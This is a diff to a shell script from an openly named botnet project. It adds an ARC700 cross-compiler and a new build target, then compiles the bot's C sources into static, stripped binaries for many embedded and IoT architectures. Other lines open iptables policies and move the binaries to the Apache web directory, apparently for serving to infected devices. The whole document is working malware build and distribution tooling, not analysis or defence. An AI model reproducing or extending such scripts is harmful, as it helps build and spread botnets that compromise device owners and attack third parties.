@@ -13,7 +13,16 @@ sudo iptables -P OUTPUT ACCEPT
 sudo iptables -P FORWARD ACCEPT
 
 service apache2 start
-
+# ARC700 GCC
+mkdir /etc/xcompile
+cd /etc/xcompile
+wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
+echo 'export PATH=/etc/xcompile/arc/bin:$PATH' >> ~/.bashrc
+source ~/.bashrc;rm -rf *.tar.gz
+cd ~/Botnet
+cd bot
 # install ubuntu cross compilers (not recommended)
 apt install gcc-powerpc64-linux-gnu -y
 apt install gcc-mips-linux-gnu -y
@@ -36,6 +45,7 @@ m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-secti
 i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
 arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_armhf -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
 x86_64-linux-gnu-gcc *.c -o x86_64 -pthread -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
+arc-linux-gcc *.c -o arc -pthread -DARCH_arc -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
 sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -std=c99
 
 #move binaries to apache2 dir
